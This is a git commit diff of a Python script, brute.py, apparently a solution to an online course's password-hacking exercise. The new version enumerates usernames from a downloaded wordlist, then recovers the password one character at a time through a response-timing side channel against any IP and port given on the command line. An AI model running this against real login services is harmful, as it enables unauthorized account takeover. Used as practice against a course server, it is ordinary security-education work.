5cd7e62c46adf0526be6e3ae0caf6cd86b70cd05
Stuart Gray <42702437+m00tiny@users.noreply.github.com>
2022-06-23 23:55:00 -0400

    .

--- brute.py
+++ brute.py
@@ -1,23 +1,49 @@
-import sys
-import socket
-import string
+#!/usr/bin/env python3
 import itertools
+import socket
+import sys
+import urllib.request
+import json
+import datetime
 
-target = sys.argv[1]
-port = sys.argv[2]
-port = int(port)
-charset = string.ascii_letters + string.digits
+def password_generator(length):
+    for m in itertools.product(itertools.chain(range(65, 91), range(97, 123), range(48, 58)), repeat=length):
+        yield ''.join(map(chr, iter(m)))
 
-bingo = True
-while bingo:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((target, port))
-    for x in range(1, 3):
-        y = itertools.product(charset, repeat=x)
-        for z in y:
-            z = ''.join(z)
-            s.send(z.encode())
-            response = s.recv(1024).decode()
-            if response == "Connection success!":
-                print(z)
-                bingo = False
+
+args = sys.argv
+ip = args[1]
+port = int(args[2])
+
+with socket.socket() as client_socket:
+    address = (ip, port)
+    client_socket.connect(address)
+    login = {"login": "", "password": ""}
+    users = urllib.request.urlopen('https://stepik.org/media/attachments/lesson/255258/logins.txt')
+    for user in users:
+        login['login'] = user.decode().strip()
+        client_socket.send(json.dumps(login).encode())
+        response = client_socket.recv(1024)
+        message = json.loads(response.decode())
+        if message['result'] != 'Wrong login!':
+            break
+
+    password = ""
+    run = True
+
+    while run:
+        for character in password_generator(1):
+            login['password'] = password + character
+            start = datetime.datetime.now()
+            client_socket.send(json.dumps(login).encode())
+            response = client_socket.recv(1024)
+            finish = datetime.datetime.now()
+            message = json.loads(response.decode())
+            if message['result'] != 'Wrong password!' or \
+                    (finish - start).total_seconds() > 0.05:
+                password += character
+                break
+
+        if message['result'] == 'Connection success!':
+            print(json.dumps(login))
+            run = False
